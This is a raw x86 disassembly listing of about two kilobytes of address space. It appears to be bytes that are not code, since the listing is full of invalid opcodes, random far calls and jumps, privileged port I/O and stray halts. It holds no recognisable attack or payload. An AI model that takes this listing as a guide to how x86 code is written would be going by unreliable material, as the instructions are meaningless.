  4255c6:	mov    ebp,0x2df2c4f3
  4255cb:	mov    al,ds:0xafebe532
  4255d0:	call   0x9e0:0xc74c11c
  4255d7:	jo     0x4255b4
  4255d9:	js     0x425621
  4255db:	repz cmp DWORD PTR [edi-0x7b40bbb7],ebp
  4255e2:	mov    BYTE PTR [ebp+0x2bbcb829],bh
  4255e8:	das    
  4255e9:	mov    ds:0x19955e23,al
  4255ee:	lds    esi,FWORD PTR [edx]
  4255f0:	mov    ecx,0xd73d5067
  4255f5:	cmp    al,0x32
  4255f7:	cmp    esp,eax
  4255f9:	inc    esi
  4255fa:	sbb    al,0xe6
  4255fc:	iret   
  4255fd:	ret    
  4255fe:	xor    edi,DWORD PTR [edi-0x32]
  425601:	imul   edi,DWORD PTR [esi-0x685144cf],0x76c203bb
  42560b:	stc    
  42560c:	mov    eax,ds:0xaf59c852
  425611:	mov    bl,BYTE PTR ds:0x270d7cd0
  425617:	arpl   WORD PTR [ebx-0x25],dx
  42561a:	pop    ebp
  42561b:	push   es
  42561c:	xchg   esp,eax
  42561d:	sub    eax,0x940349f0
  425622:	mov    ds:0x8204067d,eax
  425627:	psrld  mm5,mm4
  42562a:	mov    ecx,0xe943f22f
  42562f:	ins    DWORD PTR es:[edi],dx
  425630:	mov    ds:0x79585e5,eax
  425635:	imul   edx,ebx,0x6d8ae673
  42563b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42563c:	retf   0xbdf7
  42563f:	cs add bh,bl
  425642:	add    BYTE PTR [eax-0x65d40bfd],dl
  425648:	in     al,dx
  425649:	lods   al,BYTE PTR ds:[esi]
  42564a:	test   DWORD PTR [esi],esp
  42564c:	adc    al,al
  42564e:	leave  
  42564f:	xchg   esp,eax
  425650:	push   es
  425651:	ror    DWORD PTR [edi-0x34],cl
  425654:	(bad)  
  425655:	es mov bp,0x7259
  42565a:	imul   edi,DWORD PTR [esi-0x3b],0xffffffdd
  42565e:	adc    bl,BYTE PTR [ebp+edx*8-0x5d]
  425662:	push   eax
  425663:	push   es
  425664:	popa   
  425665:	xor    DWORD PTR [edx+0x12],ecx
  425668:	or     ah,BYTE PTR [ebx-0x3731ed6e]
  42566e:	mov    bh,0xbc
  425670:	mov    esp,DWORD PTR [ebx]
  425672:	sbb    eax,0xe07edc23
  425677:	inc    edi
  425678:	mov    ds:0xb7c167fd,eax
  42567d:	mov    al,0x15
  42567f:	cdq    
  425680:	call   0xf6cf:0x79d691ce
  425687:	ss sahf 
  425689:	xlat   BYTE PTR ds:[ebx]
  42568a:	mov    ds:0x57894024,al
  42568f:	jo     0x42563f
  425691:	dec    ebp
  425692:	fwait
  425693:	jb     0x42563a
  425695:	adc    BYTE PTR [esi+edi*2],0x31
  425699:	jmp    0x425685
  42569b:	and    al,BYTE PTR [edi]
  42569d:	mov    eax,0x5002d0e4
  4256a2:	adc    ah,BYTE PTR [ecx-0xed56594]
  4256a8:	mov    eax,ds:0x4e988950
  4256ad:	lods   al,BYTE PTR ds:[esi]
  4256ae:	push   ds
  4256af:	xchg   esp,eax
  4256b0:	ret    
  4256b1:	add    eax,0x5165fa1b
  4256b6:	fldcw  WORD PTR [ebx+ebp*8-0x56]
  4256ba:	out    dx,al
  4256bb:	vpcmpgtb xmm6,xmm2,XMMWORD PTR [edx-0x61f73f32]
  4256c3:	or     esp,esp
  4256c5:	fisub  WORD PTR [ebp-0x3b]
  4256c8:	adc    dl,BYTE PTR [ebx]
  4256ca:	inc    esi
  4256cb:	xchg   BYTE PTR [esi-0x21],cl
  4256ce:	fadd   DWORD PTR [ecx-0x120c56a]
  4256d4:	sbb    al,0x8d
  4256d6:	pop    ds
  4256d7:	dec    ebp
  4256d8:	popa   
  4256d9:	push   ds
  4256da:	push   ds
  4256db:	ret    
  4256dc:	aam    0xdb
  4256de:	lds    ebp,FWORD PTR [edi+0x8bdeae8]
  4256e4:	cli    
  4256e5:	push   ss
  4256e6:	mov    eax,0xce39f1f6
  4256eb:	jne    0x425722
  4256ed:	mov    al,0x41
  4256ef:	loopne 0x42570a
  4256f1:	mov    edi,0x206e943e
  4256f6:	mov    cl,0x97
  4256f8:	or     ah,ch
  4256fa:	das    
  4256fb:	xor    esp,DWORD PTR [esi]
  4256fd:	cmp    al,0x6a
  4256ff:	repz icebp 
  425701:	fwait
  425702:	jo     0x425757
  425704:	pop    ss
  425705:	popa   
  425706:	pop    ss
  425707:	aad    0xda
  425709:	push   esp
  42570a:	cs xchg ebx,eax
  42570c:	int3   
  42570d:	xor    dh,bh
  42570f:	gs clc 
  425711:	shl    DWORD PTR [edi],0x9f
  425714:	cdq    
  425715:	repnz push ecx
  425717:	(bad)  
  425719:	adc    BYTE PTR [edi-0x2834ea86],dh
  42571f:	mov    dh,0xce
  425721:	pop    eax
  425722:	jb     0x42572f
  425724:	inc    eax
  425725:	dec    ecx
  425726:	sbb    BYTE PTR [ecx-0x3f1de37],dl
  42572c:	adc    bl,BYTE PTR [eax+0x71]
  42572f:	xchg   DWORD PTR [ebx+0x71],ebp
  425732:	mov    eax,ds:0x37614a17
  425737:	leave  
  425738:	fs in  eax,dx
  42573a:	add    eax,0xfcb717f4
  42573f:	retf   
  425740:	sbb    al,0x99
  425742:	jmp    0xd602:0x68df857f
  425749:	jg     0x425797
  42574b:	popa   
  42574c:	xlat   BYTE PTR ds:[ebx]
  42574d:	mov    dl,BYTE PTR [edx-0x2a]
  425750:	cdq    
  425751:	lock rcl DWORD PTR [ebp-0x11],1
  425755:	adc    dh,BYTE PTR [edi+0x6c]
  425758:	popf   
  425759:	mov    ch,0x60
  42575b:	mov    edx,0x29288e7b
  425760:	inc    esi
  425761:	dec    bp
  425763:	push   ebx
  425764:	xor    BYTE PTR [ecx+0x4b],bl
  425767:	fiadd  DWORD PTR [ebx-0x34]
  42576a:	sar    BYTE PTR [eax+0x7777cd52],1
  425770:	ja     0x425706
  425772:	and    DWORD PTR ds:0x64eb94f4,0x94a3fcbd
  42577c:	pushf  
  42577d:	dec    eax
  42577e:	arpl   WORD PTR [ebx],bp
  425780:	aaa    
  425781:	je     0x425772
  425783:	or     eax,0xf0180c4c
  425788:	inc    esp
  425789:	mov    bl,0xb7
  42578b:	jne    0x425777
  42578d:	addr16 jmp 0x7a4c4703
  425793:	nop
  425794:	sub    ebx,DWORD PTR [ebp-0x3eb10d54]
  42579a:	mov    ch,0x48
  42579c:	maxps  xmm1,xmm0
  42579f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257a0:	mov    dl,0x8d
  4257a2:	adc    bl,BYTE PTR [edi+0xf4b4aff]
  4257a8:	mov    esp,0x449d2f14
  4257ad:	mov    al,0x98
  4257af:	sbb    eax,0xb6b98039
  4257b4:	cs mov ecx,0x70cfd5a5
  4257ba:	and    DWORD PTR [eax+0x38cee738],esp
  4257c0:	mov    es,WORD PTR [ecx+0x3d5150e]
  4257c6:	add    eax,0x24acf507
  4257cb:	jne    0x42580a
  4257cd:	jecxz  0x42583b
  4257cf:	(bad)  
  4257d0:	xchg   ebp,eax
  4257d1:	lds    eax,FWORD PTR [esi+0x6d534427]
  4257d7:	(bad)  
  4257d8:	cmc    
  4257d9:	sbb    BYTE PTR [edi-0x5c6a19ba],dh
  4257df:	inc    eax
  4257e0:	add    eax,DWORD PTR [ebx-0x11]
  4257e3:	xor    esi,DWORD PTR [edi]
  4257e5:	mov    esp,0x32b24365
  4257ea:	mov    eax,0x97a2fe0b
  4257ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257f0:	lock arpl WORD PTR [edi-0x7d],bp
  4257f4:	push   esp
  4257f5:	(bad)  
  4257f6:	and    BYTE PTR [eax+0x5ce5eca0],ch
  4257fc:	xchg   edi,eax
  4257fd:	mov    eax,ds:0x68441b9d
  425802:	jne    0x4257ff
  425804:	sub    al,0x5e
  425806:	ins    BYTE PTR es:[edi],dx
  425807:	rcr    ah,cl
  425809:	add    al,0xc8
  42580b:	test   DWORD PTR [ecx],0xcd3b0a05
  425811:	pop    ecx
  425812:	sub    DWORD PTR [ebx-0x41e8681],esi
  425818:	pop    esp
  425819:	add    ecx,ebp
  42581b:	mov    ds:0x20e2a89e,al
  425820:	push   esp
  425821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425822:	popa   
  425823:	scas   eax,DWORD PTR es:[edi]
  425824:	loopne 0x4257ba
  425826:	sbb    dl,BYTE PTR [ebx]
  425828:	cmp    eax,0xc1b839bb
  42582d:	in     eax,dx
  42582e:	neg    BYTE PTR ds:0xe75375f
  425834:	in     eax,0x81
  425836:	push   edi
  425837:	push   eax
  425838:	stc    
  425839:	and    esi,esi
  42583b:	push   edx
  42583c:	es lahf 
  42583e:	loopne 0x425851
  425840:	mov    cl,BYTE PTR [esi]
  425842:	mov    eax,ds:0x2a054386
  425847:	daa    
  425848:	rcl    DWORD PTR [eax],cl
  42584a:	inc    ebx
  42584b:	sbb    ebx,DWORD PTR [ebp-0x143a89a2]
  425851:	sbb    DWORD PTR [eax-0x6f62dec1],ebx
  425857:	loop   0x425853
  425859:	cmc    
  42585a:	sbb    BYTE PTR [ebp-0x14],ah
  42585d:	mov    bl,0x1e
  42585f:	mov    ah,dh
  425861:	imul   ecx,DWORD PTR [edx+0x27a9fef3],0x23736346
  42586b:	sbb    ebp,DWORD PTR [eax]
  42586d:	or     eax,0x9dd0e9ee
  425872:	ret    0x2ee2
  425875:	cmp    bl,BYTE PTR [esi-0x19e21442]
  42587b:	mov    eax,ds:0x29f5b762
  425880:	or     BYTE PTR [ebx],bl
  425882:	pop    es
  425883:	inc    edx
  425884:	push   es
  425885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425886:	sar    DWORD PTR [edx-0x30],1
  425889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42588a:	jmp    0x425875
  42588c:	mov    edx,0xd0978d87
  425891:	and    BYTE PTR [ebx-0x438eb901],bl
  425897:	(bad)  
  425898:	(bad)  
  425899:	scas   al,BYTE PTR es:[edi]
  42589a:	jge    0x425890
  42589c:	repnz inc esp
  42589e:	aam    0x65
  4258a0:	push   edi
  4258a1:	enter  0x9a1b,0xd2
  4258a5:	sub    ah,ch
  4258a7:	push   esp
  4258a8:	(bad)  
  4258aa:	push   ss
  4258ab:	mov    ebp,0x62b703f3
  4258b0:	mov    edi,0x2c5419d5
  4258b5:	ss push eax
  4258b7:	fldenv [ecx]
  4258b9:	dec    eax
  4258ba:	cmp    DWORD PTR cs:[esi+0x486cdafb],0xfffffff4
  4258c2:	ror    DWORD PTR [bx],cl
  4258c5:	ror    BYTE PTR [esp+esi*2+0x6d],1
  4258c9:	inc    edx
  4258ca:	scas   eax,DWORD PTR es:[edi]
  4258cb:	scas   al,BYTE PTR es:[edi]
  4258cc:	push   ebx
  4258cd:	out    0xf0,eax
  4258cf:	(bad)  
  4258d0:	loope  0x425892
  4258d2:	outs   dx,BYTE PTR ds:[esi]
  4258d3:	lods   al,BYTE PTR ds:[esi]
  4258d4:	dec    edi
  4258d5:	imul   esp,DWORD PTR [ebp-0x2b34024d],0x4279aca4
  4258df:	in     al,dx
  4258e0:	mov    dl,0xf7
  4258e2:	imul   BYTE PTR [eax-0x5]
  4258e5:	in     al,0xd9
  4258e7:	lds    ebx,FWORD PTR [ebx+0x9]
  4258ea:	das    
  4258eb:	ret    
  4258ec:	jmp    0x1057:0xa3eb268c
  4258f3:	clc    
  4258f4:	enter  0xaf5c,0xbe
  4258f8:	push   0x30
  4258fa:	jge    0x425918
  4258fc:	jl     0x4258fe
  4258fe:	loop   0x4258ee
  425900:	pop    es
  425901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425902:	xchg   ebx,eax
  425903:	dec    edx
  425904:	ds popa 
  425906:	inc    esp
  425907:	fdiv   DWORD PTR gs:[edi+esi*1+0x406d062f]
  42590f:	fstp   DWORD PTR [ecx+0x3c9b37ee]
  425915:	mov    eax,ds:0x2a0f5017
  42591a:	mov    WORD PTR [ebx+esi*1+0x12],es
  42591e:	adc    BYTE PTR [edx],ch
  425920:	sub    esp,edx
  425922:	ss jb  0x4258fa
  425925:	and    esi,DWORD PTR [ecx-0x17]
  425928:	cwde   
  425929:	ja     0x4258af
  42592b:	ins    DWORD PTR es:[edi],dx
  42592c:	pop    edi
  42592d:	dec    edi
  42592e:	mov    ch,0xd8
  425930:	dec    edx
  425931:	inc    edi
  425932:	leave  
  425933:	ja     0x4258ed
	...
  425941:	in     al,dx
  425942:	test   BYTE PTR [eax-0x5f],ah
  425945:	push   0xedcdede5
  42594a:	cld    
  42594b:	mov    BYTE PTR [ebx+0x964984a],ah
  425951:	push   ecx
  425952:	rol    BYTE PTR [ecx],1
  425954:	add    BYTE PTR [ebx+eax*1+0x2bfd0000],ch
  42595b:	sub    ecx,DWORD PTR [edi]
  42595d:	int3   
  42595e:	xchg   ecx,eax
  42595f:	add    BYTE PTR es:[edx-0x36],bh
  425963:	inc    edi
  425964:	xlat   BYTE PTR ds:[ebx]
  425965:	imul   esp,DWORD PTR [ebx-0x407ffbd],0x5d153469
  42596f:	cwde   
  425970:	int    0x17
  425972:	fstp   QWORD PTR [esi]
  425974:	iret   
  425975:	adc    eax,0x30318a8e
  42597a:	pop    edi
  42597b:	mov    dl,0xde
  42597d:	in     al,dx
  42597e:	inc    ebx
  42597f:	aaa    
  425980:	inc    ebp
  425981:	jge    0x425944
  425983:	enter  0xa726,0xea
  425987:	add    al,BYTE PTR [eax+0x42]
  42598a:	sahf   
  42598b:	adc    DWORD PTR [esi-0x71394310],0xd31ebc8f
  425995:	fwait
  425996:	push   esp
  425997:	pop    edx
  425998:	data16 das 
  42599a:	cmp    BYTE PTR [edx],dh
  42599c:	loope  0x425953
  42599e:	xor    esi,eax
  4259a0:	out    dx,eax
  4259a1:	pop    ss
  4259a2:	in     al,dx
  4259a3:	test   BYTE PTR [edi-0x15],ch
  4259a6:	xchg   BYTE PTR [ebx+eax*8-0x30],cl
  4259aa:	mov    ecx,0x52e35e97
  4259af:	jns    0x425999
  4259b1:	dec    esi
  4259b2:	push   cs
  4259b3:	jne    0x4259f7
  4259b5:	jle    0x425947
  4259b7:	cmp    DWORD PTR [ebp+0x638e51fd],esp
  4259bd:	xchg   DWORD PTR [ecx+esi*8+0x0],esp
  4259c1:	ja     0x425971
  4259c3:	jg     0x4259d0
  4259c5:	mov    edi,0x767252b7
  4259ca:	push   ebx
  4259cb:	sub    BYTE PTR ds:0x891bda86,cl
  4259d1:	xchg   ebp,eax
  4259d2:	ins    DWORD PTR es:[edi],dx
  4259d3:	push   eax
  4259d4:	inc    esp
  4259d5:	sti    
  4259d6:	call   0x8cb1fb07
  4259db:	dec    eax
  4259dc:	xchg   esi,eax
  4259dd:	dec    eax
  4259de:	test   al,0x60
  4259e0:	xor    bl,bl
  4259e2:	imul   eax,DWORD PTR [edx],0x4d
  4259e5:	in     al,dx
  4259e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259e7:	cmp    al,0x74
  4259e9:	jle    0x4259a1
  4259eb:	add    ecx,DWORD PTR [edx]
  4259ed:	dec    ebx
  4259ee:	sbb    bl,BYTE PTR [esp+ebp*1]
  4259f1:	sbb    DWORD PTR [eax],edx
  4259f3:	frstor [edx+eax*2+0x6]
  4259f7:	rcr    ebp,1
  4259f9:	mov    edi,eax
  4259fb:	mov    DWORD PTR [esi-0x21717949],eax
  425a01:	mov    ebx,DWORD PTR [ecx+0x4da92596]
  425a07:	loop   0x425a18
  425a09:	(bad)  
  425a0a:	jne    0x4259ae
  425a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a0d:	mov    ebx,0xf19a5c5c
  425a12:	inc    esi
  425a13:	cmp    esi,DWORD PTR [eax+ebx*8]
  425a16:	cmc    
  425a17:	js     0x4259b9
  425a19:	fadd   st(6),st
  425a1b:	pop    eax
  425a1c:	xchg   edi,eax
  425a1d:	sub    al,0x12
  425a1f:	push   0xfffffffe
  425a21:	idiv   ebx
  425a23:	xor    eax,0x90bb1a8a
  425a28:	pop    ds
  425a29:	ins    BYTE PTR es:[edi],dx
  425a2a:	sub    bh,ah
  425a2c:	lods   al,BYTE PTR ds:[esi]
  425a2d:	stc    
  425a2e:	jp     0x4259dc
  425a30:	push   ecx
  425a31:	lods   al,BYTE PTR ds:[esi]
  425a32:	ins    BYTE PTR es:[edi],dx
  425a33:	pop    ss
  425a34:	mov    ds:0x150abbd2,eax
  425a39:	hlt    
  425a3a:	cmp    eax,0xab708f5d
  425a3f:	push   ecx
  425a40:	stos   WORD PTR es:[edi],ax
  425a42:	mov    eax,ds:0xdd4ef7b6
  425a47:	mov    BYTE PTR [esi],dl
  425a49:	hlt    
  425a4a:	shl    esi,cl
  425a4c:	sbb    eax,0xd8e62c3f
  425a51:	or     cl,BYTE PTR [eax-0x53298cc7]
  425a57:	cmc    
  425a58:	popf   
  425a59:	neg    esp
  425a5b:	xchg   edi,eax
  425a5c:	push   ebp
  425a5d:	aaa    
  425a5e:	dec    esp
  425a5f:	sbb    al,0x47
  425a61:	jmp    0xa54b:0xd902ed64
  425a68:	mov    eax,ds:0x2c3466fe
  425a6d:	cmp    DWORD PTR [ebx+0x2df62b65],edi
  425a73:	inc    edi
  425a74:	mov    esi,0x23eae41d
  425a79:	fnstenv [ebp+ebp*2+0x2c]
  425a7d:	dec    edi
  425a7e:	mov    ah,0xc0
  425a80:	jecxz  0x425ace
  425a82:	cld    
  425a83:	test   DWORD PTR [eax],ecx
  425a85:	ret    0xbeb2
  425a88:	jo     0x425a71
  425a8a:	fs pushf 
  425a8c:	mov    edx,DWORD PTR [ebx-0x3ea53085]
  425a92:	out    dx,eax
  425a93:	sbb    al,0xa2
  425a95:	jmp    DWORD PTR [eax+0x1321a157]
  425a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a9c:	xor    dl,dh
  425a9e:	call   0x2e78:0xa8dc67d6
  425aa5:	pop    ss
  425aa6:	xor    eax,DWORD PTR [ebx+0xe]
  425aa9:	jo     0x425afb
  425aab:	jle    0x425ae6
  425aad:	call   0xb749:0x110cac6e
  425ab4:	jecxz  0x425abe
  425ab6:	xor    esi,DWORD PTR [bp-0x68]
  425aba:	sub    DWORD PTR [ebp-0x44],esp
  425abd:	cmp    DWORD PTR [eax-0x115b65a3],eax
  425ac3:	xcrypt-ctr (bad)
  425ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ac5:	sbb    bh,al
  425ac7:	pop    ds
  425ac8:	js     0x425a7c
  425aca:	adc    eax,0x200f85cc
  425acf:	mov    ebx,0xab99cb79
  425ad4:	jecxz  0x425ab6
  425ad6:	add    ah,BYTE PTR [ecx+0x45d97dc]
  425adc:	jl     0x425ad9
  425ade:	or     DWORD PTR [esi+0x20a32744],esp
  425ae4:	lods   al,BYTE PTR ds:[esi]
  425ae5:	adc    BYTE PTR [ecx+0x4ccbc1a8],ah
  425aeb:	fcos   
  425aed:	jo     0x425ac4
  425aef:	fidivr WORD PTR [esi+0x72dc64a1]
  425af5:	cmc    
  425af6:	push   cs
  425af7:	scas   eax,DWORD PTR es:[edi]
  425af8:	xor    ebx,DWORD PTR [ecx+0x2f0a934d]
  425afe:	and    al,0xf9
  425b00:	push   0xf242be39
  425b05:	or     ah,BYTE PTR [ebx+eiz*8]
  425b08:	xor    al,0xd9
  425b0a:	scas   eax,DWORD PTR es:[edi]
  425b0b:	mov    ss,WORD PTR [ebx-0x5dbda71c]
  425b11:	ror    DWORD PTR [esi+0x5f],cl
  425b14:	pop    edi
  425b15:	mov    cl,0x56
  425b17:	inc    ebp
  425b18:	xchg   ecx,eax
  425b19:	into   
  425b1a:	adc    eax,0xf977f4f4
  425b1f:	dec    ebp
  425b20:	xchg   ebp,eax
  425b21:	popf   
  425b22:	push   ebx
  425b23:	push   ebp
  425b24:	mov    eax,ds:0xffe3758
  425b29:	mov    bl,0x20
  425b2b:	mov    ds:0x603e58d1,al
  425b30:	sahf   
  425b31:	rol    DWORD PTR [esi+edi*8-0x66],1
  425b35:	mov    ebp,0x5cb1545c
  425b3a:	xchg   edx,eax
  425b3b:	mov    edx,0xbddebb0f
  425b40:	add    esi,eax
  425b42:	out    dx,eax
  425b43:	inc    esi
  425b44:	fwait
  425b45:	push   0x3da67d81
  425b4a:	sub    DWORD PTR [eax],edi
  425b4c:	ins    BYTE PTR es:[edi],dx
  425b4d:	ss adc dh,bh
  425b50:	cli    
  425b51:	push   0x7c2fc8fb
  425b56:	jle    0x425b33
  425b58:	iret   
  425b59:	push   esp
  425b5a:	sbb    DWORD PTR [ecx],esp
  425b5c:	mov    al,0xb5
  425b5e:	adc    DWORD PTR [ecx+0x61],0x8822677a
  425b65:	inc    ecx
  425b66:	cdq    
  425b67:	and    ah,BYTE PTR [esi]
  425b69:	clc    
  425b6a:	sbb    eax,DWORD PTR [ebx-0x134e16f9]
  425b70:	ret    0x7b8a
  425b73:	mov    esi,0x4c97ad01
  425b78:	or     edx,DWORD PTR [edx-0x4f9b18ba]
  425b7e:	test   eax,0xc06be12e
  425b83:	(bad)  
  425b84:	popa   
  425b85:	test   eax,0x83142f
  425b8a:	fsub   DWORD PTR [eax-0x36a2cd3a]
  425b90:	jno    0x425b9f
  425b92:	pop    eax
  425b93:	cs retf 
  425b95:	outs   dx,BYTE PTR ds:[esi]
  425b96:	add    DWORD PTR [eax+edx*4+0x20546fe1],ebx
  425b9d:	pop    eax
  425b9e:	pop    ecx
  425b9f:	ret    0xbba7
  425ba2:	dec    ecx
  425ba3:	lods   eax,DWORD PTR ds:[esi]
  425ba4:	fsubr  QWORD PTR [ebx+0x17f9c9b7]
  425baa:	(bad)  
  425bab:	into   
  425bac:	out    0x6a,al
  425bae:	outs   dx,BYTE PTR ds:[esi]
  425baf:	jp     0x425ba0
  425bb1:	xlat   BYTE PTR ds:[ebx]
  425bb2:	xor    eax,0x2e2209a0
  425bb7:	inc    esi
  425bb8:	out    dx,eax
  425bb9:	mov    eax,0xea891700
  425bbe:	outs   dx,DWORD PTR ds:[esi]
  425bbf:	jne    0x425c0e
  425bc1:	imul   ch
  425bc3:	xor    dh,BYTE PTR [eax-0x60]
  425bc6:	mov    edx,0x4e53ece
  425bcb:	out    dx,al
  425bcc:	jo     0x425c07
  425bce:	lea    edx,[ebp-0x51b4be60]
  425bd4:	add    al,0x8a
  425bd6:	adc    eax,0xcf3c3d0f
  425bdb:	pop    esi
  425bdc:	cmp    dh,bl
  425bde:	xchg   DWORD PTR [ebp-0x21],esi
  425be1:	loopne 0x425c33
  425be3:	out    dx,eax
  425be4:	mov    bl,0x90
  425be6:	call   0x663e:0xad6367c
  425bed:	mov    al,ds:0x49e56060
  425bf2:	mov    bl,0x20
  425bf4:	sbb    DWORD PTR ds:0x1f025904,ecx
  425bfa:	out    0x52,al
  425bfc:	loope  0x425c41
  425bfe:	sub    BYTE PTR [ebp+0x1e],cl
  425c01:	cmc    
  425c02:	xchg   edx,eax
  425c03:	not    DWORD PTR [edx-0x31d22320]
  425c09:	scas   eax,DWORD PTR es:[edi]
  425c0a:	ret    0x6efe
  425c0d:	mov    al,0xc5
  425c10:	sar    ecx,cl
  425c12:	jmp    0xe2dcf0cf
  425c17:	xchg   dl,dh
  425c19:	cmp    eax,0x3e87c02f
  425c1e:	stos   DWORD PTR es:[edi],eax
  425c1f:	shl    DWORD PTR [ebx],cl
  425c21:	retf   
  425c22:	jmp    0xaa82:0xaca30fed
  425c29:	cmp    dh,BYTE PTR [edx]
  425c2b:	push   ebx
  425c2c:	jo     0x425c68
  425c2e:	bound  eax,QWORD PTR ds:0xd81db31a
  425c34:	fdivr  DWORD PTR ds:0x89c78c59
  425c3a:	push   edi
  425c3b:	xchg   DWORD PTR [esp+esi*4+0x46],edi
  425c3f:	jmp    0xfe33:0x991abac0
  425c46:	stos   DWORD PTR es:[edi],eax
  425c47:	xchg   esp,eax
  425c48:	xchg   esi,eax
  425c49:	xor    BYTE PTR [ecx-0x4b],dl
  425c4c:	pop    edi
  425c4d:	std    
  425c4e:	ins    BYTE PTR es:[edi],dx
  425c4f:	arpl   bx,ax
  425c51:	daa    
  425c52:	mov    eax,ds:0x1271ac66
  425c57:	cmp    al,0xed
  425c59:	cmp    eax,0x7a09e3ea
  425c5e:	rcr    BYTE PTR [ebx],1
  425c60:	fadd   st(2),st
  425c62:	das    
  425c63:	std    
  425c64:	jle    0x425c1f
  425c66:	fidivr WORD PTR [ecx]
  425c68:	jmp    0xc69dc917
  425c6d:	xchg   ebp,eax
  425c6e:	sub    eax,0xd53fbdaa
  425c73:	or     bl,BYTE PTR [edx-0x5c]
  425c76:	xor    ch,0xec
  425c79:	fisub  WORD PTR [edi-0x181498a0]
  425c7f:	daa    
  425c80:	mov    esi,0x532cbc2c
  425c85:	and    ebp,DWORD PTR [ebp-0x3d34b670]
  425c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c8d:	scas   al,BYTE PTR es:[edi]
  425c8e:	out    0x4f,eax
  425c90:	jno    0x425cd9
  425c92:	popa   
  425c93:	mov    ebx,0x646dfab3
  425c98:	cmc    
  425c99:	pop    es
  425c9a:	jge    0x425cd0
  425c9c:	push   eax
  425c9d:	sub    bl,0x4b
  425ca0:	push   eax
  425ca1:	int3   
  425ca2:	inc    eax
  425ca3:	xchg   WORD PTR [ebp+0x59],dx
  425ca7:	sub    al,0x2c
  425ca9:	mov    esi,0x4fc76df0
  425cae:	jg     0x425c8a
  425cb0:	out    0xcf,eax
  425cb2:	cmp    DWORD PTR [edi+edi*4],0xdbad7fdb
  425cb9:	out    dx,al
  425cba:	sub    ebx,eax
  425cbc:	mov    al,0x93
  425cbe:	scas   al,BYTE PTR es:[edi]
  425cbf:	outs   dx,DWORD PTR ds:[esi]
  425cc0:	jmp    0x425c55
  425cc2:	leave  
  425cc3:	adc    DWORD PTR [edi-0x2b],ecx
  425cc6:	retf   0x35af
  425cc9:	mov    edx,0x4c347fe2
  425cce:	clc    
  425ccf:	inc    ecx
  425cd0:	iret   
  425cd1:	jno    0x425c7e
  425cd3:	mov    bh,0x69
  425cd5:	sub    dh,BYTE PTR [edi+0x67]
  425cd8:	mov    bh,0xde
  425cda:	cmp    DWORD PTR [edx+ebp*8+0x5faa9895],ebx
  425ce1:	dec    eax
  425ce2:	test   esi,ecx
  425ce4:	ins    BYTE PTR es:[edi],dx
  425ce5:	xor    edi,DWORD PTR [esi+0x1f]
  425ce8:	and    eax,esi
  425cea:	fwait
  425ceb:	cdq    
  425cec:	jo     0x425d24
  425cee:	inc    edx
  425cef:	dec    BYTE PTR [ebp+0x29cec8ac]
  425cf5:	xchg   esp,eax
  425cf6:	mov    bh,0x83
  425cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cf9:	jno    0x425d5d
  425cfb:	lea    ebp,[ecx+0x27099606]
  425d01:	jmp    0xce4f41
	...
  425d0e:	add    BYTE PTR [eax],al
  425d10:	add    BYTE PTR [edx+0x51],bl
  425d13:	leave  
  425d14:	popf   
  425d15:	retf   
  425d16:	popf   
  425d17:	pop    esi
  425d18:	xlat   BYTE PTR ds:[ebx]
  425d19:	loope  0x425d6f
  425d1b:	lock adc esp,DWORD PTR fs:[edx]
  425d1f:	and    BYTE PTR [eax],dh
  425d21:	std    
  425d22:	rol    DWORD PTR [ecx],cl
  425d24:	add    BYTE PTR [ebx+eax*1-0x7c9b0000],ch
  425d2b:	lods   al,BYTE PTR ds:[esi]
  425d2c:	mov    cl,bh
  425d2e:	call   0x2340dea7
  425d33:	adc    eax,0x2854d01b
  425d38:	cwde   
  425d39:	xor    eax,0xdfc8ae08
  425d3e:	hlt    
  425d3f:	inc    eax
  425d40:	xchg   ecx,eax
  425d41:	(bad)  
  425d43:	retf   0x3f03
  425d46:	dec    ebp
  425d47:	mov    cl,0x7d
  425d49:	add    al,0x3e
  425d4b:	adc    esp,DWORD PTR [edi+0x37f497ef]
  425d51:	or     BYTE PTR [eax+0x5a6d7d4c],bl
  425d57:	out    dx,al
  425d58:	adc    eax,DWORD PTR [esi]
  425d5a:	mov    al,ds:0x3341f7a5
  425d5f:	sub    BYTE PTR [edx+0x9ac639d],ch
  425d65:	call   0x5fdf:0x12c44e62
  425d6c:	ins    DWORD PTR es:[edi],dx
  425d6d:	fwait
  425d6e:	popa   
  425d6f:	sti    
  425d70:	xlat   BYTE PTR ds:[ebx]
  425d71:	leave  
  425d72:	hlt    
  425d73:	or     ebx,DWORD PTR [bx+si]
  425d76:	repz or edi,esi
  425d79:	mov    gs,WORD PTR [ecx+esi*4-0x31]
  425d7d:	adc    BYTE PTR [edi+0x2801a0ee],0x24
  425d84:	pop    esi
  425d85:	inc    ebp
  425d86:	outs   dx,DWORD PTR ds:[esi]
  425d87:	sub    eax,0x78fb9c5
  425d8c:	adc    dl,BYTE PTR [eax+0x6b]
  425d8f:	xor    eax,0x6ecfd89b
  425d94:	inc    edx
  425d95:	fnstcw WORD PTR [edi]
  425d97:	mov    al,0xc0
  425d99:	ja     0x425d9d
  425d9b:	mov    eax,ds:0x13638e25
  425da0:	enter  0xca8a,0xfc
  425da4:	sub    eax,0xb98ff61e
  425da9:	push   ss
  425daa:	sbb    eax,DWORD PTR [edi+0x33]
  425dad:	cwde   
  425dae:	fstp   DWORD PTR [eax-0x72]
  425db1:	xchg   ecx,eax
  425db2:	pop    esp
  425db3:	mov    ecx,0xf843aa75
  425db8:	push   0x21465397
  425dbd:	push   esi
  425dbe:	ins    DWORD PTR es:[edi],dx
  425dbf:	xchg   esp,eax
  425dc0:	xchg   ecx,eax
  425dc1:	leave  
  425dc2:	sub    eax,0x683feeac
  425dc7:	popa   
  425dc8:	jae    0x425da4
